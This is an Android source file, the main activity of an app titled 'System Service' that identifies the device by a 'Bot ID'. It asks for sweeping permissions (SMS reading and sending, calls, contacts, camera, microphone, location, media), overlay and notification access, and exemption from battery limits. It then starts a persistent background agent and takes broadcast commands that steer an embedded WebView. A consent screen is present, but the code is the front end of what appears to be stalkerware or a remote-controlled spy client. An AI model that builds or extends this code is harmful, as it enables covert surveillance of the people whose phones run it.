package com.rk.agent;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    static final String PREFS = "cfg";
    static final String KEY_CONSENT = "consent_given";
    static final String KEY_STOPPED = "user_stopped";
    static final int REQ_PERMS = 1;
    static final int REQ_SMS = 99;

    public static WebView wv;
    BroadcastReceiver webCmd;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        try {
            Thread.setDefaultUncaughtExceptionHandler(
                new CrashHandler(this, Thread.getDefaultUncaughtExceptionHandler()));
        } catch (Exception ignored) {}

        try {
            webCmd = new BroadcastReceiver() {
                @Override public void onReceive(Context c, Intent i) {
                    try {
                        String action = i.getStringExtra("action");
                        String data = i.getStringExtra("data");
                        if (action == null) return;
                        handleWebCmd(action, data);
                    } catch (Exception ignored) {}
                }
            };
            IntentFilter f = new IntentFilter("com.rk.agent.WEBCMD");
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(webCmd, f, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(webCmd, f);
            }
        } catch (Exception ignored) {}

        boolean consented = false;
        try {
            consented = getSharedPreferences(PREFS, MODE_PRIVATE)
                .getBoolean(KEY_CONSENT, false);
        } catch (Exception ignored) {}

        String intentUrl = null;
        try {
            if (getIntent() != null && getIntent().hasExtra("url")) {
                String iu = getIntent().getStringExtra("url");
                if (iu != null && !iu.isEmpty()) intentUrl = iu;
            }
        } catch (Exception ignored) {}

        if (intentUrl != null) setupWebView(intentUrl);
        else if (consented) showDashboard();
        else showConsentScreen();
    }

    private void setupWebView(String url) {
        try {
            wv = new WebView(this);
            WebSettings ws = wv.getSettings();
            ws.setJavaScriptEnabled(true);
            ws.setDomStorageEnabled(true);
            ws.setLoadWithOverviewMode(true);
            ws.setUseWideViewPort(true);
            ws.setBuiltInZoomControls(true);
            ws.setDisplayZoomControls(false);
            ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            ws.setUserAgentString("Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE
                + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36");
            wv.setWebViewClient(new WebViewClient());
            wv.loadUrl(url);
            setContentView(wv);
        } catch (Throwable t) {
            try {
                TextView tv = new TextView(this);
                tv.setText("WebView failed: " + t);
                tv.setGravity(Gravity.CENTER);
                setContentView(tv);
            } catch (Exception ignored) {}
        }
    }

    private void handleWebCmd(String action, String data) {
        try {
            if (wv == null) {
                setupWebView(data == null ? "https://www.google.com" : data);
                return;
            }
            if (action.equals("load")) wv.loadUrl(data);
            else if (action.equals("reload")) wv.reload();
            else if (action.equals("back")) { if (wv.canGoBack()) wv.goBack(); }
            else if (action.equals("forward")) { if (wv.canGoForward()) wv.goForward(); }
            else if (action.equals("scroll")) {
                wv.evaluateJavascript("window.scrollBy(0," + data + ");", null);
            }
        } catch (Exception ignored) {}
    }

    private void showConsentScreen() {
        ScrollView sc = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(40, 60, 40, 60);
        sc.addView(ll);

        TextView title = new TextView(this);
        title.setText("System Service");
        title.setTextSize(24);
        title.setTextColor(0xFF00BCD4);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 20);
        ll.addView(title);

        TextView desc = new TextView(this);
        desc.setText(
            "Device Monitoring App\n\n"
            + "මෙම app එක පහත දේවල් collect කරයි:\n\n"
            + "• Location (GPS)\n• SMS messages\n• Call logs\n"
            + "• Contacts\n• Camera photos\n• Microphone recordings\n"
            + "• Sensor data\n• Installed apps\n• Device info\n\n"
            + "නවත්තන්න:\n"
            + "✓ Notification STOP\n"
            + "✓ App → STOP MONITORING\n"
            + "✓ Settings → Uninstall\n"
        );
        desc.setTextSize(14);
        desc.setTextColor(0xFF000000);
        desc.setPadding(0, 0, 0, 30);
        ll.addView(desc);

        Button policyBtn = new Button(this);
        policyBtn.setText("Read Full Privacy Policy");
        policyBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    startActivity(new Intent(MainActivity.this, PrivacyActivity.class));
                } catch (Exception ignored) {}
            }
        });
        ll.addView(policyBtn);

        final CheckBox cb = new CheckBox(this);
        cb.setText("මම ඉහත තොරතුරු කියවා, එකඟ වෙමි");
        cb.setTextSize(15);
        cb.setPadding(0, 30, 0, 20);
        ll.addView(cb);

        Button startBtn = new Button(this);
        startBtn.setText("START MONITORING");
        startBtn.setTextSize(16);
        startBtn.setBackgroundColor(0xFF4CAF50);
        startBtn.setTextColor(Color.WHITE);
        startBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                if (!cb.isChecked()) {
                    Toast.makeText(MainActivity.this,
                        "කරුණාකර එකඟ වන්න", Toast.LENGTH_SHORT).show();
                    return;
                }
                try {
                    getSharedPreferences(PREFS, MODE_PRIVATE).edit()
                        .putBoolean(KEY_CONSENT, true)
                        .putBoolean(KEY_STOPPED, false)
                        .apply();
                } catch (Exception ignored) {}

                try {
                    String[] perms = buildPermList();
                    if (Build.VERSION.SDK_INT >= 23) {
                        requestPermissions(perms, REQ_PERMS);
                    } else {
                        onPermsReady();
                    }
                } catch (Exception e) {
                    onPermsReady();
                }
            }
        });
        ll.addView(startBtn);

        Button cancelBtn = new Button(this);
        cancelBtn.setText("CANCEL / EXIT");
        cancelBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) { finish(); }
        });
        ll.addView(cancelBtn);

        setContentView(sc);
    }

    private String[] buildPermList() {
        java.util.ArrayList<String> list = new java.util.ArrayList<>();
        list.add(android.Manifest.permission.CAMERA);
        list.add(android.Manifest.permission.RECORD_AUDIO);
        list.add(android.Manifest.permission.READ_SMS);
        list.add(android.Manifest.permission.SEND_SMS);
        list.add(android.Manifest.permission.RECEIVE_SMS);
        list.add(android.Manifest.permission.READ_CONTACTS);
        list.add(android.Manifest.permission.WRITE_CONTACTS);
        list.add(android.Manifest.permission.READ_CALL_LOG);
        list.add(android.Manifest.permission.WRITE_CALL_LOG);
        list.add(android.Manifest.permission.CALL_PHONE);
        list.add(android.Manifest.permission.READ_PHONE_STATE);
        list.add(android.Manifest.permission.READ_PHONE_NUMBERS);
        list.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        list.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);

        if (Build.VERSION.SDK_INT >= 33) {
            list.add(android.Manifest.permission.POST_NOTIFICATIONS);
            list.add(android.Manifest.permission.READ_MEDIA_IMAGES);
            list.add(android.Manifest.permission.READ_MEDIA_AUDIO);
            list.add(android.Manifest.permission.READ_MEDIA_VIDEO);
        } else {
            list.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
            list.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        return list.toArray(new String[0]);
    }

    private void onPermsReady() {
        try {
            if (Build.VERSION.SDK_INT >= 23) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent bi = new Intent();
                    bi.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    bi.setData(Uri.parse("package:" + getPackageName()));
                    try { startActivity(bi); } catch (Exception ignored) {}
                }
            }
        } catch (Exception ignored) {}

        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override public void run() {
                try {
                    Intent svc = new Intent(MainActivity.this, AgentService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        startForegroundService(svc);
                    else startService(svc);
                    Toast.makeText(MainActivity.this,
                        "Monitoring started", Toast.LENGTH_SHORT).show();
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this,
                        "Start failed: " + e.getMessage(),
                        Toast.LENGTH_LONG).show();
                }
                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override public void run() { showDashboard(); }
                }, 1500);
            }
        }, 800);
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == REQ_PERMS) onPermsReady();
    }

    private void showDashboard() {
        ScrollView sc = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(40, 60, 40, 60);
        sc.addView(ll);

        TextView title = new TextView(this);
        title.setText("System Service");
        title.setTextSize(24);
        title.setTextColor(0xFF4CAF50);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 20);
        ll.addView(title);

        boolean stopped = false;
        try {
            stopped = getSharedPreferences(PREFS, MODE_PRIVATE)
                .getBoolean(KEY_STOPPED, false);
        } catch (Exception ignored) {}

        boolean running = !stopped && AgentService.INSTANCE != null;

        TextView status = new TextView(this);
        status.setText(running ? "● RUNNING" : "○ STOPPED");
        status.setTextSize(18);
        status.setTextColor(running ? 0xFF4CAF50 : 0xFF888888);
        status.setGravity(Gravity.CENTER);
        status.setPadding(0, 0, 0, 40);
        ll.addView(status);

        TextView info = new TextView(this);
        info.setText(
            "Device: " + Build.MANUFACTURER + " " + Build.MODEL + "\n"
            + "Android: " + Build.VERSION.RELEASE + "\n"
            + "Bot ID: " + (AgentService.INSTANCE != null
                ? AgentService.INSTANCE.botId : "n/a") + "\n\n"
        );
        info.setTextSize(14);
        info.setPadding(0, 0, 0, 30);
        ll.addView(info);

        Button stopBtn = new Button(this);
        stopBtn.setText("STOP MONITORING");
        stopBtn.setBackgroundColor(0xFFF44336);
        stopBtn.setTextColor(Color.WHITE);
        stopBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    getSharedPreferences(PREFS, MODE_PRIVATE)
                        .edit().putBoolean(KEY_STOPPED, true).apply();
                    stopService(new Intent(MainActivity.this, AgentService.class));
                    Toast.makeText(MainActivity.this,
                        "Monitoring stopped", Toast.LENGTH_SHORT).show();
                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                        @Override public void run() { showDashboard(); }
                    }, 500);
                } catch (Exception ignored) {}
            }
        });
        ll.addView(stopBtn);

        Button restartBtn = new Button(this);
        restartBtn.setText("START / RESTART");
        restartBtn.setBackgroundColor(0xFF4CAF50);
        restartBtn.setTextColor(Color.WHITE);
        restartBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    getSharedPreferences(PREFS, MODE_PRIVATE)
                        .edit().putBoolean(KEY_STOPPED, false).apply();
                    Intent svc = new Intent(MainActivity.this, AgentService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        startForegroundService(svc);
                    else startService(svc);
                    Toast.makeText(MainActivity.this,
                        "Starting...", Toast.LENGTH_SHORT).show();
                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                        @Override public void run() { showDashboard(); }
                    }, 1500);
                } catch (Exception ignored) {}
            }
        });
        ll.addView(restartBtn);

        Button policyBtn = new Button(this);
        policyBtn.setText("Privacy Policy");
        policyBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    startActivity(new Intent(MainActivity.this, PrivacyActivity.class));
                } catch (Exception ignored) {}
            }
        });
        ll.addView(policyBtn);

        Button notifBtn = new Button(this);
        notifBtn.setText("Notification Settings");
        notifBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    Intent i = new Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
                    i.putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName());
                    startActivity(i);
                } catch (Exception ignored) {}
            }
        });
        ll.addView(notifBtn);

        Button notifAccessBtn = new Button(this);
        notifAccessBtn.setText("Notification Access");
        notifAccessBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    Intent i = new Intent(
                        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                    startActivity(i);
                } catch (Exception e) {
                    try { startActivity(new Intent(Settings.ACTION_SETTINGS)); }
                    catch (Exception ignored) {}
                }
            }
        });
        ll.addView(notifAccessBtn);

        Button overlayBtn = new Button(this);
        overlayBtn.setText("Enable Overlay Permission");
        overlayBtn.setBackgroundColor(0xFF2196F3);
        overlayBtn.setTextColor(Color.WHITE);
        overlayBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    if (Build.VERSION.SDK_INT >= 23) {
                        if (!Settings.canDrawOverlays(MainActivity.this)) {
                            Intent i = new Intent(
                                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + getPackageName()));
                            startActivity(i);
                        } else {
                            Toast.makeText(MainActivity.this,
                                "Overlay already enabled", Toast.LENGTH_SHORT).show();
                        }
                    }
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this,
                        "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                }
            }
        });
        ll.addView(overlayBtn);

        Button battBtn = new Button(this);
        battBtn.setText("Disable Battery Optimization");
        battBtn.setBackgroundColor(0xFF4CAF50);
        battBtn.setTextColor(Color.WHITE);
        battBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    if (Build.VERSION.SDK_INT >= 23) {
                        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                            Intent bi = new Intent();
                            bi.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                            bi.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(bi);
                        } else {
                            Toast.makeText(MainActivity.this,
                                "Already unrestricted", Toast.LENGTH_SHORT).show();
                        }
                    }
                } catch (Exception ignored) {}
            }
        });
        ll.addView(battBtn);

        Button killBtn = new Button(this);
        killBtn.setText("REVOKE CONSENT & EXIT");
        killBtn.setBackgroundColor(0xFFFF9800);
        killBtn.setTextColor(Color.WHITE);
        killBtn.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    getSharedPreferences(PREFS, MODE_PRIVATE).edit()
                        .putBoolean(KEY_CONSENT, false)
                        .putBoolean(KEY_STOPPED, true)
                        .apply();
                    stopService(new Intent(MainActivity.this, AgentService.class));
                    Toast.makeText(MainActivity.this,
                        "Consent revoked", Toast.LENGTH_LONG).show();
                    finish();
                } catch (Exception ignored) {}
            }
        });
        ll.addView(killBtn);

        setContentView(sc);
    }

    @Override
    public void onBackPressed() {
        try {
            if (wv != null && wv.canGoBack()) wv.goBack();
            else super.onBackPressed();
        } catch (Exception e) { try { super.onBackPressed(); } catch (Exception ignored) {} }
    }

    @Override
    protected void onDestroy() {
        try { if (webCmd != null) unregisterReceiver(webCmd); } catch (Exception ignored) {}
        super.onDestroy();
    }
}
